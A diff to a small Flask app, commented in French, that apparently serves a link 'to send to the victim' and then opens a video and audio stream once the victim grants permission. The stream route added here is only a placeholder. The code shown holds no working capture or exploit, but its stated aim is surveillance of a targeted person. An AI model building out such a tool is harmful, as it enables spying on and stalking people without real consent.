@@ -2,6 +2,8 @@ from flask import Flask, render_template, request, jsonify
 import socket
 import random
 import pyfiglet
+import threading
+import os
 
 # Créer une interface ASCII art avec pyfiglet
 def display_interface():
@@ -42,7 +44,7 @@ def get_local_ip():
 def get_random_port():
     return random.randint(5000, 65535)
 
-# Route pour la page principale
+# Route pour la page principale (affichage du lien à envoyer à la victime)
 @app.route("/")
 def index():
     return render_template("index.html")
@@ -65,11 +67,16 @@ def victim_permission():
 # Route pour démarrer le flux après l'autorisation de la victime
 @app.route("/start_stream", methods=["POST"])
 def start_stream():
-    # Ici on peut mettre un traitement pour commencer le flux vidéo et audio
     local_ip = get_local_ip()
     port = get_random_port()  # Le port change à chaque fois
     stream_url = f"http://{local_ip}:{port}/stream"
     return jsonify({"stream_url": stream_url})
+
+# Route pour afficher le flux vidéo et audio
+@app.route("/stream")
+def stream():
+    # Ici, vous pouvez utiliser une solution pour afficher les flux vidéo et audio
+    return render_template("stream.html")
 
 if __name__ == "__main__":
     local_ip = get_local_ip()
